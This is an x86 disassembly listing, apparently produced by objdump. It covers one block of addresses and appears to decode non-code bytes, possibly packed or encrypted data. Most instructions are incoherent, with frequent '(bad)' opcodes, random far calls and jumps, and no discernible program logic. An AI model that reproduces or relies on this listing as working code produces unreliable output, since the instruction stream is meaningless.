  4020dc:	test   DWORD PTR [edi-0x65],esp
  4020df:	int    0x8b
  4020e1:	dec    ecx
  4020e2:	pop    edx
  4020e3:	inc    esp
  4020e4:	test   BYTE PTR [ebp-0x45],0x6a
  4020e8:	xor    DWORD PTR [edx+0x7df1286],0x37
  4020ef:	sbb    al,0xa3
  4020f1:	jno    0x4020b6
  4020f3:	lds    esp,FWORD PTR [ebx]
  4020f5:	sbb    DWORD PTR [edi+ebx*8],ebp
  4020f8:	adc    edi,edi
  4020fa:	(bad)  
  4020fb:	cmp    bh,al
  4020fd:	adc    eax,0x128bc1f9
  402102:	inc    ebx
  402103:	add    eax,0xd974ab4f
  402108:	jecxz  0x4020b4
  40210a:	loope  0x4020b6
  40210c:	inc    edx
  40210d:	xor    bh,BYTE PTR [ebx-0x25d7f87d]
  402113:	ror    DWORD PTR [edx],0x6b
  402116:	outs   dx,DWORD PTR ds:[esi]
  402117:	and    edi,DWORD PTR [edi]
  402119:	(bad)  
  40211a:	push   eax
  40211b:	mov    cl,0x6b
  40211d:	ja     0xfce26196
  402123:	dec    ecx
  402124:	stc    
  402125:	cmp    al,0x3f
  402127:	pop    edi
  402128:	shl    BYTE PTR [eax],cl
  40212a:	cld    
  40212b:	sbb    dl,cl
  40212d:	sub    BYTE PTR [eax+0x16784ecc],bh
  402133:	mov    dl,0x7f
  402135:	xchg   esi,eax
  402136:	dec    ebx
  402137:	stc    
  402138:	sti    
  402139:	pop    esp
  40213a:	or     eax,0xf81f1be6
  40213f:	in     eax,0x3e
  402141:	xchg   edi,eax
  402142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402143:	pop    eax
  402144:	push   0xa8163dc9
  402149:	mul    DWORD PTR [eax+0x1a]
  40214c:	add    al,0x2a
  40214e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40214f:	scas   eax,DWORD PTR es:[edi]
  402150:	xor    edi,DWORD PTR [ecx]
  402152:	sbb    BYTE PTR [ecx+0x1524904c],bl
  402158:	das    
  402159:	lods   al,BYTE PTR ds:[esi]
  40215a:	mov    al,0x95
  40215c:	and    bh,BYTE PTR [edx+0x75]
  40215f:	adc    bh,dh
  402161:	or     eax,DWORD PTR [edi+ebp*1-0x1c]
  402165:	or     BYTE PTR [eax+eiz*8],ah
  402168:	je     0x402171
  40216a:	leave  
  40216b:	cmp    edi,esi
  40216d:	stc    
  40216e:	popa   
  40216f:	mov    WORD PTR [eax-0x12],fs
  402172:	or     eax,0x6446946c
  402177:	mov    ebx,0x9162e71
  40217c:	idiv   BYTE PTR [eax+0x604b1abb]
  402182:	repnz sub al,BYTE PTR [eax+ecx*8+0x73]
  402187:	xor    bl,BYTE PTR [ecx+0x3d674c0e]
  40218d:	sub    ah,bh
  40218f:	sub    DWORD PTR [ebx],edx
  402191:	sub    eax,0x73c377f1
  402196:	xchg   ebp,eax
  402197:	sti    
  402198:	js     0x40211c
  40219a:	push   esi
  40219b:	rcr    DWORD PTR [eax],1
  40219d:	fmulp  st(1),st
  40219f:	push   ebp
  4021a0:	jne    0x4021f1
  4021a2:	xchg   DWORD PTR [ebx-0x7b],eax
  4021a5:	mov    al,ds:0x3a06f367
  4021aa:	xor    esi,DWORD PTR [eax]
  4021ac:	icebp  
  4021ad:	fs and esp,edi
  4021b0:	xlat   BYTE PTR ds:[ebx]
  4021b1:	add    esp,edi
  4021b3:	adc    DWORD PTR [esi+0x7f02ed6b],edi
  4021b9:	dec    edx
  4021ba:	sbb    al,0xd1
  4021bc:	mov    eax,ds:0x76009cd3
  4021c1:	pop    eax
  4021c2:	retf   
  4021c3:	pop    edx
  4021c4:	mov    edi,0x9e021a07
  4021c9:	sub    eax,0xd8f7b342
  4021ce:	stc    
  4021cf:	push   ecx
  4021d0:	retf   
  4021d1:	fwait
  4021d2:	repz pop esi
  4021d4:	mov    edi,0xad3549d3
  4021d9:	pop    ds
  4021da:	sbb    eax,0xbf5b1b39
  4021df:	mov    ?,edx
  4021e1:	and    ebp,esp
  4021e3:	jne    0x4021ff
  4021e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021e6:	stos   BYTE PTR es:[edi],al
  4021e7:	mov    ah,0x90
  4021e9:	div    DWORD PTR [edi+edi*1+0x7da17595]
  4021f0:	sbb    eax,edx
  4021f2:	loope  0x4021a0
  4021f4:	aam    0x24
  4021f6:	xchg   esp,eax
  4021f7:	sar    ah,cl
  4021f9:	int    0xe4
  4021fb:	fdiv   QWORD PTR [ebp+0x19]
  4021fe:	xchg   edi,eax
  4021ff:	mov    ch,0x6d
  402201:	in     al,dx
  402202:	ins    DWORD PTR es:[edi],dx
  402203:	dec    esi
  402204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402205:	ss sahf 
  402207:	mov    ds:0x18e431cd,al
  40220c:	iret   
  40220d:	adc    eax,ebp
  40220f:	imul   edx,DWORD PTR [esi-0x5b42beae],0x99b351ee
  402219:	xor    BYTE PTR [edx+edx*2-0x4cc6c14d],al
  402220:	inc    ebx
  402221:	ficomp DWORD PTR ds:0x1ab2
  402226:	retf   
  402227:	add    DWORD PTR [ecx-0x13152ead],edi
  40222d:	ss pop ss
  40222f:	xchg   esi,eax
  402230:	push   0x1f
  402232:	xchg   eax,ecx
  402234:	xchg   esi,eax
  402235:	ins    BYTE PTR es:[edi],dx
  402236:	sahf   
  402237:	aaa    
  402238:	adc    esi,0xffffffb4
  40223b:	aaa    
  40223c:	adc    eax,0x530cc57f
  402241:	outs   dx,DWORD PTR ds:[esi]
  402242:	aas    
  402243:	xor    BYTE PTR [eax+0x2b],0xab
  402247:	add    DWORD PTR [eax+0x26],ebx
  40224a:	(bad)  
  40224b:	adc    edi,ebx
  40224d:	inc    esp
  40224e:	scas   eax,DWORD PTR es:[edi]
  40224f:	push   0x3a02e268
  402254:	mov    ebp,0xc33a800e
  402259:	adc    BYTE PTR [ecx],0xed
  40225c:	mov    eax,ds:0xd934b322
  402261:	sub    al,0xf
  402263:	and    bh,bh
  402265:	into   
  402266:	sbb    dh,dh
  402268:	sbb    DWORD PTR [ecx],0x867e91b1
  40226e:	jae    0x40223c
  402270:	jge    0x402266
  402272:	xor    DWORD PTR [ebx-0x6c],eax
  402275:	retf   
  402276:	sub    eax,0x6b7c4c1b
  40227b:	cld    
  40227c:	int    0x80
  40227e:	fld    QWORD PTR [esp+esi*4]
  402281:	adc    ecx,DWORD PTR [edi-0x33]
  402284:	imul   edi,DWORD PTR [edx+0x71],0x3286b349
  40228b:	fwait
  40228c:	sub    BYTE PTR [ebx],0x23
  40228f:	push   edx
  402290:	fidivr DWORD PTR [ebx+0x4e78f3f4]
  402296:	push   esp
  402297:	ret    
  402298:	and    BYTE PTR [edi-0x42588702],dl
  40229e:	dec    DWORD PTR [edx-0x41]
  4022a1:	inc    ebp
  4022a2:	lods   eax,DWORD PTR ds:[esi]
  4022a3:	dec    ecx
  4022a4:	cli    
  4022a5:	cwde   
  4022a6:	(bad)  
  4022a7:	loop   0x40222a
  4022a9:	xor    DWORD PTR [edi-0x11],esi
  4022ac:	xor    DWORD PTR [ebx-0x725be602],ebx
  4022b2:	push   ecx
  4022b3:	mov    esi,DWORD PTR [edx-0x2332800c]
  4022b9:	adc    BYTE PTR [ebp-0x3c],dh
  4022bc:	mov    eax,0x17dbcc3f
  4022c1:	ds cld 
  4022c3:	repnz mov DWORD PTR ds:0xa1152b21,edx
  4022ca:	out    dx,al
  4022cb:	mov    ebx,0x1a184ec0
  4022d0:	push   es
  4022d1:	icebp  
  4022d2:	adc    WORD PTR [eax+ebp*8],bp
  4022d6:	pop    edx
  4022d7:	mov    ah,0x53
  4022d9:	dec    ebp
  4022da:	push   ss
  4022db:	and    edi,DWORD PTR [ecx+0x71]
  4022de:	sbb    al,0x8a
  4022e0:	(bad)  
  4022e1:	outs   dx,BYTE PTR ds:[esi]
  4022e2:	test   eax,0x1c882fd7
  4022e7:	inc    edi
  4022e8:	mov    DWORD PTR [edx-0x4f],edx
  4022eb:	mov    cl,0xcd
  4022ed:	or     al,0xb8
  4022ef:	aad    0xad
  4022f1:	pop    edx
  4022f2:	repnz inc esi
  4022f4:	pop    esp
  4022f5:	out    0x76,al
  4022f7:	mov    esp,0x2f116518
  4022fc:	fwait
  4022fd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4022ff:	out    dx,al
  402300:	rcl    dh,1
  402302:	mov    BYTE PTR [ebp+edi*4+0x19],dl
  402306:	adc    BYTE PTR [esi+0x3e],dh
  402309:	in     eax,dx
  40230a:	rcl    ebp,0xa5
  40230d:	mov    al,ds:0x3f1761f5
  402312:	sub    al,0x7b
  402314:	es jg  0x402373
  402317:	mov    ch,0x6c
  402319:	cs std 
  40231b:	sbb    dh,BYTE PTR [esi+0x77c76a6b]
  402321:	retf   
  402322:	push   ds
  402323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402324:	stos   DWORD PTR es:[edi],eax
  402325:	inc    edi
  402326:	jb     0x402379
  402328:	call   0xf66d78ba
  40232d:	sub    BYTE PTR [ebx],dl
  40232f:	into   
  402330:	enter  0xe0d8,0x61
  402334:	and    esi,ecx
  402336:	pop    ebp
  402337:	jp     0x4022ec
  402339:	out    dx,al
  40233a:	inc    ebx
  40233b:	loop   0x402388
  40233d:	gs icebp 
  40233f:	call   DWORD PTR [edx-0x1da7f266]
  402345:	data16 and BYTE PTR [edi+0x20],ah
  402349:	cld    
  40234a:	sub    BYTE PTR [esi+0x77],bl
  40234d:	xor    al,0xf4
  40234f:	push   ecx
  402350:	xchg   ebx,eax
  402351:	adc    eax,0x74cf5096
  402356:	outs   dx,DWORD PTR ds:[esi]
  402357:	pusha  
  402358:	out    dx,al
  402359:	sub    eax,0xe8cb3778
  40235e:	call   0x65c648dd
  402363:	mov    esp,0xcafd05f3
  402368:	mov    dl,0x98
  40236a:	sti    
  40236b:	je     0x402327
  40236d:	cmp    cl,BYTE PTR [ebp-0x13cb4344]
  402373:	(bad)  
  402374:	adc    cl,ch
  402376:	ret    0x1ea4
  402379:	jmp    0x40235e
  40237b:	ss pop esp
  40237d:	sub    BYTE PTR [esi],dh
  40237f:	mov    al,BYTE PTR ds:0xd91f953d
  402385:	inc    edx
  402386:	or     eax,0x6ea1a614
  40238b:	pop    edi
  40238c:	test   BYTE PTR [ecx],ch
  40238e:	xlat   BYTE PTR ds:[ebx]
  40238f:	addr16 xchg ebx,eax
  402391:	in     al,0xb9
  402393:	loope  0x402339
  402395:	or     eax,0x457a36f0
  40239a:	inc    edx
  40239b:	out    0x41,eax
  40239d:	loop   0x4023bf
  40239f:	and    ebx,DWORD PTR [eax+0x17]
  4023a2:	inc    edx
  4023a3:	or     DWORD PTR [ecx+0x34c4d446],0x61
  4023aa:	call   0x1002:0x4fa4c182
  4023b1:	aad    0x3
  4023b3:	mov    ch,0x59
  4023b5:	dec    ebx
  4023b6:	inc    edi
  4023b7:	jmp    0x402437
  4023b9:	dec    esp
  4023ba:	xchg   ebx,eax
  4023bb:	cmp    bl,BYTE PTR [eax-0x5c]
  4023be:	add    DWORD PTR [ebx+0x3caee256],esi
  4023c4:	repz mov bl,0xc7
  4023c7:	fs jbe 0x402429
  4023ca:	(bad)  
  4023cb:	cs retf 0x710b
  4023cf:	sbb    BYTE PTR [eax],ah
  4023d1:	(bad)  es:[ebx+0x4685ae75]
  4023d8:	in     eax,dx
  4023d9:	(bad)  
  4023da:	jns    0x402416
  4023dc:	cmp    BYTE PTR [edx],ch
  4023de:	dec    ebp
  4023df:	and    dh,BYTE PTR [edx-0x69]
  4023e2:	test   BYTE PTR [eax+0x2743dbc4],ah
  4023e8:	jns    0x402427
  4023ea:	cmp    al,0xae
  4023ec:	jg     0x402386
  4023ee:	add    esi,DWORD PTR [edi-0xf]
  4023f1:	xchg   ebp,eax
  4023f2:	ficom  WORD PTR [esi+0x26]
  4023f5:	add    edi,eax
  4023f7:	jmp    0x5f04e121
  4023fc:	clc    
  4023fd:	(bad)  
  4023fe:	outs   dx,BYTE PTR ds:[esi]
  4023ff:	mov    bl,0x88
  402401:	push   ebp
  402402:	push   ecx
  402403:	call   0xb8da:0xac814942
  40240a:	sbb    ebx,DWORD PTR [eax]
  40240c:	push   ss
  40240d:	adc    eax,0xfe730720
  402412:	push   ecx
  402413:	jmp    0xc213:0x8e600bd7
  40241a:	popf   
  40241b:	sub    eax,0xd7f9438f
  402420:	mov    cl,0x92
  402422:	dec    esp
  402423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402424:	and    ebp,ecx
  402426:	add    DWORD PTR [edx],0x121ec766
  40242c:	pop    esp
  40242d:	push   esp
  40242e:	scas   al,BYTE PTR es:[edi]
  40242f:	int3   
  402430:	call   0xec82:0x3ec6e44a
  402437:	stc    
  402438:	adc    BYTE PTR [eax+edi*2],bh
  40243b:	adc    eax,0x722009aa
  402440:	pop    ebp
  402441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402442:	test   BYTE PTR [edx-0x4f],bh
  402445:	lahf   
  402446:	mov    eax,0xd815d389
  40244b:	jecxz  0x402468
  40244d:	pop    eax
  40244e:	fisub  WORD PTR [esi]
  402450:	mov    dl,0x37
  402452:	xchg   ebp,eax
  402453:	sub    BYTE PTR [ecx+esi*8+0x4dd4ba8],dl
  40245a:	xchg   edi,eax
  40245b:	icebp  
  40245c:	add    eax,0x9b083fc9
  402461:	pusha  
  402462:	or     cl,BYTE PTR [esi-0x681bd29f]
  402468:	clc    
  402469:	out    0xaa,eax
  40246b:	jecxz  0x402494
  40246d:	pop    esi
  40246e:	and    DWORD PTR [ebp+eiz*4-0x147ac418],ecx
  402475:	pop    edi
  402476:	scas   eax,DWORD PTR es:[edi]
  402477:	mov    dh,0x15
  402479:	test   BYTE PTR [ecx-0x44],bl
  40247c:	mov    eax,ds:0x7e1e0d66
  402481:	inc    edx
  402482:	fs cld 
  402484:	mov    eax,ds:0xf1bd2ccb
  402489:	adc    eax,0xc7c655a5
  40248e:	adc    BYTE PTR [eax-0x1eeb0ba7],0xb
  402495:	enter  0x3a1f,0xba
  402499:	mov    dh,0x12
  40249b:	push   es
  40249c:	stos   BYTE PTR es:[edi],al
  40249d:	push   eax
  40249e:	jp     0x402460
  4024a0:	in     al,0xc2
  4024a2:	test   eax,0xf9e07a1e
  4024a7:	jecxz  0x4024a2
  4024a9:	adc    DWORD PTR [edx-0x18],ecx
  4024ac:	fild   DWORD PTR [esi+0x4e]
  4024af:	push   ebx
  4024b0:	and    edi,DWORD PTR [eax-0x8]
  4024b3:	mov    eax,ds:0x5c0c90db
  4024b8:	hlt    
  4024b9:	(bad)
  4024bd:	or     eax,0x7b329917
  4024c2:	cwde   
  4024c3:	push   ebp
  4024c4:	je     0x402542
  4024c6:	neg    DWORD PTR [ebp+0x59e6563a]
  4024cc:	adc    eax,0xe1eab4f8
  4024d1:	add    eax,0x69149e13
  4024d6:	sub    esp,DWORD PTR [eax-0x60]
  4024d9:	xor    BYTE PTR [ebp-0x6bbfe14b],bl
  4024df:	cwde   
  4024e0:	int3   
  4024e1:	es cs push eax
  4024e4:	sub    esp,eax
  4024e6:	je     0x402483
  4024e8:	cwde   
  4024e9:	xlat   BYTE PTR ds:[ebx]
  4024ea:	and    eax,0xa1f7ac7d
  4024ef:	dec    esi
  4024f0:	cdq    
  4024f1:	not    DWORD PTR [edi-0x53b6c1b5]
  4024f7:	sub    al,0xef
  4024f9:	mov    ds:0x6a2e2f92,al
  4024fe:	add    esi,DWORD PTR [edi-0x403f8e47]
  402504:	fsubp  st(5),st
  402506:	test   DWORD PTR [ecx],esp
  402508:	jmp    0x4024fd
  40250a:	xchg   esi,eax
  40250b:	or     ebx,DWORD PTR [esi-0x72]
  40250e:	ins    DWORD PTR es:[edi],dx
  40250f:	hlt    
  402510:	jbe    0x402502
  402512:	xchg   ecx,eax
  402513:	div    DWORD PTR [ecx-0x2b4a7833]
  402519:	sbb    edx,DWORD PTR [edx+eax*1+0x4c]
  40251d:	out    dx,al
  40251e:	loopne 0x4024ce
  402520:	cmp    eax,DWORD PTR [edi]
  402522:	outs   dx,DWORD PTR ds:[esi]
  402523:	push   esi
  402524:	xchg   BYTE PTR ds:0x23833fea,dl
  40252a:	jle    0x40256a
  40252c:	into   
  40252d:	rol    BYTE PTR [ebp-0xb6cad6c],1
  402533:	sbb    al,0x23
  402535:	cs pop edx
  402537:	out    dx,al
  402538:	cdq    
  402539:	inc    esi
  40253a:	(bad)  
  40253b:	into   
  40253c:	out    dx,al
  40253d:	sbb    BYTE PTR [edx-0xed4b567],0x32
  402544:	mov    al,0x78
  402546:	mov    bl,0xae
  402548:	mov    DWORD PTR [ebp-0x14a59916],ecx
  40254e:	push   esi
  40254f:	ins    DWORD PTR es:[edi],dx
  402550:	in     eax,dx
  402551:	stos   BYTE PTR es:[edi],al
  402552:	jecxz  0x4024e2
  402554:	jb     0x4024fd
  402556:	into   
  402557:	pusha  
  402558:	sar    DWORD PTR [ecx-0x31],cl
  40255b:	or     edi,DWORD PTR [ebp-0x5c]
  40255e:	test   ebp,0x82b281dc
  402564:	add    DWORD PTR [ecx+0x55],esp
  402567:	retf   0xb7d8
  40256a:	dec    eax
  40256b:	mov    DWORD PTR [ecx-0x11],esi
  40256e:	(bad)
  402572:	pop    edi
  402573:	repz xlat BYTE PTR ds:[ebx]
  402575:	jle    0x402549
  402577:	push   ebp
  402578:	bound  ebp,QWORD PTR [ebx-0x11f1e54d]
  40257e:	gs push eax
  402580:	retf   
  402581:	std    
  402582:	sub    dh,ch
  402584:	pop    es
  402585:	dec    edi
  402586:	into   
  402587:	jns    0x402582
  402589:	sub    eax,0xad63a126
  40258e:	and    al,0x7e
  402590:	pop    esp
  402591:	and    bl,BYTE PTR [ecx+0x799d9157]
  402597:	xchg   esp,eax
  402598:	nop
  402599:	pop    ebx
  40259a:	hlt    
  40259b:	xchg   ebx,eax
  40259c:	push   0xb0c237a1
  4025a1:	push   ebp
  4025a2:	push   edx
  4025a3:	sub    ch,bh
  4025a5:	mov    dl,0xf
  4025a7:	adc    eax,0xc6c37654
  4025ac:	jmp    0xe574158f
  4025b1:	lahf   
  4025b2:	sbb    eax,0x4d3e3cfd
  4025b7:	mov    cl,0xc8
  4025b9:	neg    DWORD PTR [edx]
  4025bb:	in     al,0x75
  4025bd:	mov    al,0x37
  4025bf:	push   esp
  4025c0:	jo     0x402578
  4025c2:	ror    DWORD PTR [ebp+0x5d],0x16
  4025c6:	repnz cmc 
  4025c8:	imul   edx,esi,0x29
  4025cb:	cmp    DWORD PTR [esi],ecx
  4025cd:	mov    ebp,0x125053b5
  4025d2:	add    edx,DWORD PTR [edi]
  4025d4:	cli    
  4025d5:	iret   
  4025d6:	pop    edx
  4025d7:	sbb    eax,DWORD PTR [ebx]
  4025d9:	jno    0x402639
  4025db:	popf   
  4025dc:	cmp    DWORD PTR [edi+0x34],ebx
  4025df:	sbb    BYTE PTR [ebx],cl
  4025e1:	dec    esi
  4025e2:	jmp    0x4025ff
  4025e4:	rcl    cl,0x32
  4025e7:	inc    esp
  4025e8:	and    eax,0x688f0077
  4025ed:	xlat   BYTE PTR ds:[ebx]
  4025ee:	mov    edi,DWORD PTR [esi+0x1fd84bd3]
  4025f4:	sub    dh,bl
  4025f6:	(bad)  
  4025f7:	mov    ah,0xaf
  4025f9:	cmp    edx,DWORD PTR [esi+0x7]
  4025fc:	xchg   ecx,eax
  4025fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025fe:	ins    BYTE PTR es:[edi],dx
  4025ff:	rol    ecx,0x86
  402602:	or     bl,BYTE PTR [esi]
  402604:	add    DWORD PTR [edx+0x38],0xffffff80
  402608:	xor    eax,0x167ec58b
  40260d:	adc    DWORD PTR [eax-0x3af0540],0x9e243cdd
  402617:	xchg   esi,eax
  402618:	out    dx,eax
  402619:	dec    ebp
  40261a:	adc    BYTE PTR [esp+ebx*2],dl
  40261d:	call   0xeaed:0xe9bf2702
  402624:	push   ecx
  402625:	ins    BYTE PTR es:[edi],dx
  402626:	pop    esi
  402627:	mov    ecx,0x974e2888
  40262c:	dec    eax
  40262d:	xor    ebp,DWORD PTR [ebx+0x3d]
  402630:	imul   edi,DWORD PTR [edx+0x10],0x41
  402634:	or     ebp,ebx
  402636:	pop    esi
  402637:	ror    DWORD PTR [esi],1
  402639:	or     ebx,DWORD PTR fs:[eax-0x11]
  40263d:	test   edx,0x9ec1949b
  402643:	push   ss
  402644:	int    0xb0
  402646:	xor    al,BYTE PTR [ebx]
  402648:	aas    
  402649:	and    eax,0xe2331032
  40264e:	adc    DWORD PTR [edx+0x47a9309c],esp
  402654:	mov    eax,0xe95ec9a3
  402659:	cmp    al,0xc4
  40265b:	loope  0x402624
  40265d:	add    DWORD PTR [esi],esi
  40265f:	retf   
  402660:	inc    edx
  402661:	test   eax,0x8445f319
  402666:	pop    ebp
  402667:	mov    ds,WORD PTR [ebp-0x4c2cfd90]
  40266d:	fwait
  40266e:	add    bl,al
  402670:	push   cs
  402671:	call   0x705c5590
  402676:	adc    eax,0x129f1487
  40267b:	in     eax,0xfb
  40267d:	mov    dl,0x6a
  40267f:	clc    
  402680:	inc    eax
  402681:	adc    dl,BYTE PTR [ecx-0x206b0c]
  402687:	xor    BYTE PTR [ebx+0x16923aa7],dl
  40268d:	xor    DWORD PTR [edx+0x3f16496f],esp
  402693:	add    DWORD PTR [edi-0x6a9d390e],esp
  402699:	cmp    al,0xa1
  40269b:	mov    ebx,0x4089cf14
  4026a0:	into   
  4026a1:	(bad)  
  4026a2:	adc    BYTE PTR [eax],ch
  4026a4:	mov    edi,DWORD PTR [eax-0x2d]
  4026a7:	repz call 0xcb1:0xce30bbb9
  4026af:	mov    dl,0xc1
  4026b1:	es ins BYTE PTR es:[edi],dx
  4026b3:	mov    al,0x5a
  4026b5:	mov    bl,0x1b
  4026b7:	out    dx,eax
  4026b8:	dec    esp
  4026b9:	mov    ecx,0xf6e46c3e
  4026be:	jmp    0xf8de:0xc834d63a
  4026c5:	push   esi
  4026c6:	and    al,0x71
  4026c8:	jo     0x40271a
  4026ca:	int    0x38
  4026cc:	dec    eax
  4026cd:	cwde   
  4026ce:	icebp  
  4026cf:	fld    DWORD PTR [ecx+ebx*8]
  4026d2:	cmc    
  4026d3:	and    BYTE PTR [ebx-0x6f647ac],dh
  4026d9:	sub    DWORD PTR [edx+0x1ac1ccea],edi
  4026df:	es lock cdq 
  4026e2:	xchg   edx,eax
  4026e3:	aad    0x50
  4026e5:	pause  
  4026e7:	cmp    al,0xc1
  4026e9:	add    ch,BYTE PTR [ebx]
  4026eb:	jmp    0x9bed13e9
  4026f0:	mov    edi,0x8f6e95cb
  4026f5:	into   
  4026f6:	inc    esi
  4026f7:	mov    esi,0x582ac466
  4026fc:	jl     0x4026c5
  4026fe:	ret    0xd4f5
  402701:	ja     0x40277a
  402703:	pusha  
  402704:	retf   
  402705:	and    DWORD PTR [edi],eax
  402707:	leave  
  402708:	jbe    0x402744
  40270a:	push   0xe1b31596
  40270f:	adc    eax,0x23b31e26
  402714:	in     eax,0x8d
  402716:	xor    ebx,DWORD PTR ds:0x2bd60cb3
  40271c:	xchg   esi,eax
  40271d:	inc    eax
  40271e:	add    eax,0x6ee2fbca
  402723:	leave  
  402724:	or     dh,BYTE PTR [ecx+edi*8+0x1]
  402728:	int3   
  402729:	mov    al,ds:0xe7fe410e
  40272e:	push   0x5683f3f
  402733:	cmp    DWORD PTR [edi-0x238c40],edx
  402739:	js     0x4026ec
  40273b:	or     bh,dl
  40273d:	or     ebp,ebx
  40273f:	push   ebp
  402740:	cmp    BYTE PTR [edx+0x5d385513],bl
  402746:	test   eax,0x9437f88b
  40274b:	nop
  40274c:	cli    
  40274d:	sbb    esi,ebp
  40274f:	rcr    DWORD PTR [edi-0x1],0xc9
  402753:	es xor eax,0xb4e924c7
  402759:	fld    DWORD PTR [edx-0x21]
  40275c:	cmc    
  40275d:	adc    BYTE PTR [eax+0x62ca9cec],dl
  402763:	popf   
  402764:	(bad)  
  402765:	repnz iret 
  402767:	in     al,dx
  402768:	rcr    DWORD PTR [eax-0x76fd9ec5],1
  40276e:	fldcw  WORD PTR [ebp+edi*1+0x2289de3d]
  402775:	push   0x67b0139c
  40277a:	mov    esi,DWORD PTR ds:0xedd8375f
  402780:	scas   eax,DWORD PTR es:[edi]
  402781:	pop    edi
  402782:	inc    ecx
  402783:	pop    ecx
  402784:	imul   edx,DWORD PTR [eax],0xa390ba9c
  40278a:	les    eax,FWORD PTR [edx+0x1d10ab4f]
  402790:	mov    ds:0x52b04ead,eax
  402795:	cpuid  
  402797:	hlt    
  402798:	pop    eax
  402799:	cmp    al,0xd5
  40279b:	pop    ecx
  40279c:	xor    eax,DWORD PTR [edx]
  40279e:	into   
  40279f:	sbb    BYTE PTR [ebx-0x4f],cl
  4027a2:	dec    esi
  4027a3:	ds jl  0x4027fd
  4027a6:	inc    ebp
  4027a7:	sahf   
  4027a8:	and    BYTE PTR [edi],ah
  4027aa:	lock ret 
  4027ac:	ja     0x4027cf
  4027ae:	and    dl,bl
  4027b0:	cmp    al,0xc3
  4027b2:	xchg   ecx,eax
  4027b3:	leave  
  4027b4:	pop    ecx
  4027b5:	add    DWORD PTR [edi-0x5e],ecx
  4027b8:	push   0x72
  4027ba:	mov    cl,0x3d
  4027bc:	xchg   esp,eax
  4027bd:	sahf   
  4027be:	shl    dh,cl
  4027c0:	(bad)  
  4027c1:	xchg   ebp,eax
  4027c2:	and    cl,BYTE PTR [eax+0x35]
  4027c5:	mov    al,0xe3
  4027c7:	inc    eax
  4027c8:	loope  0x4027b5
  4027ca:	out    0xf3,al
  4027cc:	sub    esp,DWORD PTR [edx-0x4f]
  4027cf:	adc    eax,0xd7756e10
  4027d4:	in     al,0x20
  4027d6:	xchg   edx,eax
  4027d7:	inc    ebp
  4027d8:	jmp    0x402761
  4027da:	sahf   
  4027db:	dec    ebx
  4027dc:	out    dx,al
  4027dd:	dec    ecx
  4027de:	scas   eax,DWORD PTR es:[edi]
  4027df:	loop   0x40278a
  4027e1:	scas   eax,DWORD PTR es:[edi]
  4027e2:	jg     0x4027f1
  4027e4:	mov    bl,0x88
  4027e6:	cmp    eax,0x37a6f7a
  4027eb:	(bad)  
  4027ec:	ins    DWORD PTR es:[edi],dx
  4027ed:	mov    ebx,0x344e79ea
  4027f2:	inc    ebx
  4027f3:	test   al,0x2f
  4027f5:	lahf   
  4027f6:	(bad)  
  4027f7:	xor    eax,0x1047a814
  4027fc:	and    ebp,DWORD PTR [edi]
  4027fe:	mov    ?,WORD PTR [esi-0x28]
  402801:	(bad)
  402805:	mov    edx,DWORD PTR [ecx-0x643077a0]
  40280b:	sbb    edi,DWORD PTR [esi+ecx*8+0x74]
  40280f:	or     ah,ch
  402811:	mov    edx,0x53c9a38a
  402816:	loope  0x40279f
  402818:	cmp    eax,0xc9a0c0cb
  40281d:	push   ds
  40281e:	jb     0x4027d1
  402820:	and    ebp,DWORD PTR [edi]
  402822:	add    ebx,DWORD PTR [ebx]
  402824:	jmp    0xebab9e6
  402829:	out    0xd,al
  40282b:	es scas al,BYTE PTR es:[edi]
  40282d:	ret    0x2c58
  402830:	mov    esp,0xa2406bea
  402835:	xchg   edi,eax
  402836:	adc    al,0xc2
  402838:	jg     0x402849
  40283a:	sbb    ch,BYTE PTR [eax-0x74]
  40283d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40283e:	jmp    0x4027ce
  402840:	mov    esi,ebx
  402842:	xchg   ebx,eax
  402843:	xor    DWORD PTR [esi+edi*2+0x8],0xffffffed
  402848:	xlat   BYTE PTR ds:[ebx]
  402849:	mov    BYTE PTR [eax-0x49270257],ch
  40284f:	imul   ecx,DWORD PTR [ebp-0x39],0x63aed4a5
  402856:	cmp    edx,esp
  402858:	xlat   BYTE PTR ds:[ebx]
  402859:	in     eax,dx
  40285a:	(bad)  
  40285b:	pop    edi
  40285c:	xchg   esp,eax
  40285d:	xor    eax,0x16f86f83
  402862:	into   
  402863:	fmul   DWORD PTR [eax-0x2c]
  402866:	lahf   
  402867:	(bad)  
  402868:	push   ss
  402869:	inc    eax
  40286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40286b:	cmp    BYTE PTR [edx+ebp*8],al
  40286e:	mov    ds:0x95389c4d,al
  402873:	test   eax,0x82ee4eb5
  402878:	loop   0x402858
  40287a:	arpl   WORD PTR [ebx+edi*1],si
  40287d:	jbe    0x402851
  40287f:	jo     0x402845
  402881:	jne    0x40287d
  402883:	outs   dx,DWORD PTR ds:[esi]
  402884:	sbb    BYTE PTR [esi+0x682b6056],bl
  40288a:	xor    al,0xd2
  40288c:	clc    
  40288d:	les    eax,FWORD PTR [ebx]
  40288f:	test   al,0xb8
  402891:	mov    cl,0x3d
  402893:	sbb    DWORD PTR [edi+0x28dd9dac],edx
  402899:	cmp    eax,0xcd3a5541
  40289e:	in     al,0x3f
  4028a0:	std    
  4028a1:	sub    eax,0xbf20a268
  4028a6:	out    0x37,al
  4028a8:	dec    ebx
  4028a9:	fisttp WORD PTR [ebp+0x28]
  4028ac:	and    DWORD PTR [ebx-0x72],0x3d822ba0
  4028b3:	scas   al,BYTE PTR es:[edi]
  4028b4:	iret   
  4028b5:	loop   0x4028d6
  4028b7:	pop    ecx
  4028b8:	mov    bh,0x45
  4028ba:	xchg   ebp,eax
  4028bb:	(bad)
  4028be:	mov    ebx,ebp
  4028c0:	push   esi
  4028c1:	or     al,0xc9
  4028c3:	cs adc eax,0x78858140
  4028c9:	popf   
  4028ca:	mov    edx,0x81fbe7e8
  4028cf:	ret    0xe712
  4028d2:	fild   WORD PTR [esi+0x26]
